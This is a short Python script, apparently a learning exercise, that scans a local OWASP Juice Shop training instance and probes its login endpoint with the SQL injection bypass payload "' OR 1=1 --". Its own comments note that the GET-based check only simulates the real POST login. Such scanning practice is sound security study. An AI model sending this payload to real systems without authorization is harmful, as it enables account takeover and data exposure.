
import requests

# Function to check for SQL Injection
def check_sql_injection(url):
    print("\n--- Running SQL Injection Check ---")
    
    # 1. Define a simple SQL injection payload
    payload = "' OR 1=1 --"
    
    # 2. Construct the URL (we assume the target accepts input in a simple GET parameter)
    # NOTE: The Juice Shop login uses a POST request, but for this simple GET demonstration,
    # we simulate checking a vulnerable GET parameter endpoint.
    test_url = f"{url}/users/login?username={payload}&password=test" 
    
    try:
        response = requests.get(test_url, timeout=5)
        
        # 3. Check for typical success indicators
        if response.status_code == 200 and ("Welcome" in response.text or "Signed in" in response.text):
            print("!!! VULNERABILITY FOUND: SQL Injection may be possible with payload: " + payload)
        else:
            print("SQL Injection check passed (no simple bypass detected).")
            
    except requests.exceptions.RequestException as e:
        print(f"Error during SQL injection check: {e}")

# Main scanner function
def run_scanner(url):
    print(f"Starting scan for {url}")
    
    # 1. Send a basic GET request (existing logic)
    print(f"Testing URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        print(f"Status Code: {response.status_code}")
        
        if "OWASP Juice Shop" in response.text:
            print("Target identified as Juice Shop.")
            
            # --- NEW STEP: CALL THE VULNERABILITY CHECK ---
            check_sql_injection(url) 
            # ----------------------------------------------
            
    except requests.exceptions.RequestException as e:
        print(f"Error accessing URL: {e}")

# Execution block remains the same
if __name__ == "__main__":
    target_url = "http://127.0.0.1:3000" 
    run_scanner(target_url)